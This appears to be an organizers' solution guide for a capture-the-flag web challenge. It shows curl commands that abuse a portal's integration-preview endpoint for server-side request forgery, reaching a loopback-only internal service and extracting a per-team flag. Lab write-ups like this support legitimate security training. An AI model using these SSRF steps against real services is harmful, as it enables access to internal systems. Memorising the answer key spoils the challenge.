# WEB-05 — Solution (organizers)

Concise solve guide for staff who need to verify the challenge quickly.

## Prerequisites

A running per-team container. The portal is at the entry URL that GZ::CTF
reports; substitute it for `$PORTAL` below.

```bash
PORTAL=http://127.0.0.1:<entry-port>
```

## Step 1 — read the connector catalogue

The Integrations table on the portal shows a connector named
*Local Diagnostics Probe*, `kind: internal`, endpoint
`http://127.0.0.1:9000/internal/health`. The same data is in the API:

```bash
curl -s "$PORTAL/api/integrations" | jq -r '.integrations[] | "\(.kind)\t\(.endpoint)"'
```

## Step 2 — confirm the request is server-side

In the portal, paste the loopback probe into **Endpoint URL** and press
**Preview**. The browser cannot reach `127.0.0.1:9000`, yet the panel reports
`HTTP 200`. Equivalent command:

```bash
curl -s -X POST "$PORTAL/api/integrations/preview" \
  -H 'Content-Type: application/json' \
  -d '{"url":"http://127.0.0.1:9000/internal/health"}' | jq -r '.body'
```

## Step 3 — enumerate the internal service

```bash
curl -s -X POST "$PORTAL/api/integrations/preview" \
  -H 'Content-Type: application/json' \
  -d '{"url":"http://127.0.0.1:9000/internal/services"}' \
  | jq -r '.body' | jq '.services[] | select(.id=="diagnostics")'
```

This reveals `basePath: /internal/diagnostics` and `record: MD-OPS-204`.

## Step 4 — retrieve the restricted record

```bash
curl -s -X POST "$PORTAL/api/integrations/preview" \
  -H 'Content-Type: application/json' \
  -d '{"url":"http://127.0.0.1:9000/internal/diagnostics/record"}' \
  | jq -r '.body' | jq -r '.record.verification_token'
```

The output is the team's flag, e.g. `AXUM{internal_gateway_<12 hex>}`. Submit it
to GZ::CTF.

## One-liner

```bash
PORTAL=http://127.0.0.1:<entry-port>
curl -s -X POST "$PORTAL/api/integrations/preview" \
  -H 'Content-Type: application/json' \
  -d '{"url":"http://127.0.0.1:9000/internal/diagnostics/record"}' \
  | jq -r '.body' | jq -r '.record.verification_token'
```

## Notes for staff

* Three hints are stored on the challenge (`Challenge.Hints`, a list of
  markdown strings). Hint 2 is usually enough for a stuck team.
* Each team's flag differs; a flag from another team is rejected by the
  platform. Reset a team's instance by destroying and relaunching the container.
* The internal port is not published, so the flag cannot be obtained by
  connecting to `<host>:9000`; the preview endpoint is the only path.
